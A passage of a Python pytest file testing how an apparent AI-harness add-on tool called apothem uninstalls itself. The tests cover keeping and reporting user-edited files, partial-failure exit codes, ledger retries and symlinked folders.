        agent.write_text("my own agent\n", encoding="utf-8")

    plain = CliRunner().invoke(
        cli.main, ["uninstall", "--harness", "claude-code", "--yes", "--no-color"]
    )
    code, envelope = _uninstall()

    assert plain.exit_code == cli._EXIT_PARTIAL, plain.output
    for path in (mine, edited, *agents):
        assert str(path) in plain.output, path
    assert code == cli._EXIT_PARTIAL
    listed = {path for w in envelope["warnings"] for path in w.get("files", [])}
    assert {str(mine), str(edited), *(str(agent) for agent in agents)} <= listed


def test_a_failed_write_of_the_finished_record_leaves_a_retry(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ClaudeCodeAdapter().install({})
    real = install_ledger.append_record

    def refuse_finished(record: LedgerRecord, **kwargs: object) -> Path:
        if record.kind == "uninstall":
            raise OSError("disk full")
        return real(record, **kwargs)  # type: ignore[arg-type]

    monkeypatch.setattr(install_ledger, "append_record", refuse_finished)
    code, envelope = _uninstall()
    monkeypatch.setattr(install_ledger, "append_record", real)

    assert code == cli._EXIT_PARTIAL, envelope
    assert _unfinished(claude) is not None


def test_a_user_scope_holder_gets_steps_not_a_command_for_the_default_folder(
    claude: Path, tmp_path: Path
) -> None:
    from apothem.harnesses._shared import install_driver_datahome as datahome

    home = Path.home() / ".apothem"
    (home / "memory").mkdir(parents=True)
    current = tmp_path / "project"
    current.mkdir()
    for harness, root in (("cursor", current), ("codex", tmp_path / "codex-gone")):
        install_ledger.append_record(
            LedgerRecord.create(
                harness=harness, root=root, kind="install", data_home=str(home)
            )
        )

    result = datahome._remove_data_home(
        "cursor", root=current, allowed_root=Path.home(), home=home
    )

    assert result is not None
    assert result.outcome == "warning"
    assert "CODEX_HOME" in result.message
    assert "apothem uninstall --harness codex" not in result.message


def test_a_folder_kept_whole_is_reported_once(claude: Path) -> None:
    ClaudeCodeAdapter().install({})
    skill = claude / "skills" / _skill_name()
    edited = sorted(path for path in skill.rglob("*") if path.is_file())
    for path in edited:
        path.write_text("my edit\n", encoding="utf-8")

    code, envelope = _uninstall()

    assert code == 0, envelope
    listed = [path for w in envelope["warnings"] for path in w.get("files", [])]
    assert sorted(listed) == sorted({*listed})
    assert {str(path) for path in edited} <= set(listed)
    assert all(path.read_text(encoding="utf-8") == "my edit\n" for path in edited)


def test_an_earlier_release_folder_names_the_users_own_file_apart(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    _strip_digests(claude)
    skill = claude / "skills" / _skill_name()
    edited = skill / "SKILL.md"
    edited.write_text(edited.read_text(encoding="utf-8") + "\nmy edit\n", "utf-8")
    mine = skill / "mine.md"
    mine.write_text("mine\n", encoding="utf-8")

    code, envelope = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    by_reason: dict[str, set[str]] = {}
    for warning in envelope["warnings"]:
        reason = warning.get("detail", {}).get("kept_reason", "")
        by_reason.setdefault(reason, set()).update(warning.get("files", []))
    assert str(edited) in by_reason["no-digests"]
    assert str(mine) not in by_reason["no-digests"]
    assert str(mine) in by_reason["changed"]


def test_a_file_that_cannot_be_removed_still_names_the_users_files(
    claude: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ClaudeCodeAdapter().install({})
    skill = claude / "skills" / _skill_name()
    stuck = skill / "SKILL.md"
    mine = skill / "mine.md"
    mine.write_text("mine\n", encoding="utf-8")
    real_unlink = Path.unlink

    def refuse(self: Path, missing_ok: bool = False) -> None:
        if self == stuck:
            raise PermissionError("in use")
        real_unlink(self, missing_ok=missing_ok)

    monkeypatch.setattr(Path, "unlink", refuse)
    code, envelope = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    listed = [path for w in envelope["warnings"] for path in w.get("files", [])]
    assert str(mine) in listed


def test_an_install_with_no_record_leaves_the_uninstall_unfinished(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    shutil.rmtree(install_ledger.ledger_path("claude_code").parent)

    plain = CliRunner().invoke(
        cli.main, ["uninstall", "--harness", "claude-code", "--yes", "--no-color"]
    )

    assert plain.exit_code == cli._EXIT_PARTIAL, plain.output
    assert "apothem update" in plain.output
    assert (claude / "agents" / "citation-auditor.md").exists()


def test_quiet_still_lists_the_paths_an_unfinished_uninstall_kept(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    _strip_digests(claude)
    agent = claude / "agents" / "citation-auditor.md"
    agent.write_text("an earlier release wrote this\n", encoding="utf-8")

    result = CliRunner().invoke(
        cli.main,
        ["uninstall", "--harness", "claude-code", "--yes", "--quiet", "--no-color"],
    )

    assert result.exit_code == cli._EXIT_PARTIAL
    assert str(agent) in result.stderr


def test_a_kept_file_name_with_a_line_separator_is_listed_whole(
    claude: Path,
) -> None:
    ClaudeCodeAdapter().install({})
    odd = claude / "skills" / _skill_name() / "notes\u2028v2.md"
    odd.write_text("mine\n", encoding="utf-8")

    code, envelope = _uninstall()

    assert code == 0, envelope
    listed = [path for w in envelope["warnings"] for path in w.get("files", [])]
    assert str(odd) in listed


def test_an_earlier_releases_differing_files_behind_a_link_block_the_uninstall(
    claude: Path, tmp_path: Path
) -> None:
    ClaudeCodeAdapter().install({})
    _strip_digests(claude)
    rules = claude / "rules"
    for rule in rules.glob("*.md"):
        rule.write_text(rule.read_text(encoding="utf-8") + "\nolder text\n", "utf-8")
    dotfiles = tmp_path / "dotfiles" / "rules"
    dotfiles.parent.mkdir(parents=True)
    shutil.move(str(rules), str(dotfiles))
    _link_folder(rules, dotfiles)

    code, envelope = _uninstall()

    assert code == cli._EXIT_PARTIAL, envelope
    assert "still loads them" in envelope["results"][0]["message"]
    assert _unfinished(claude) is not None
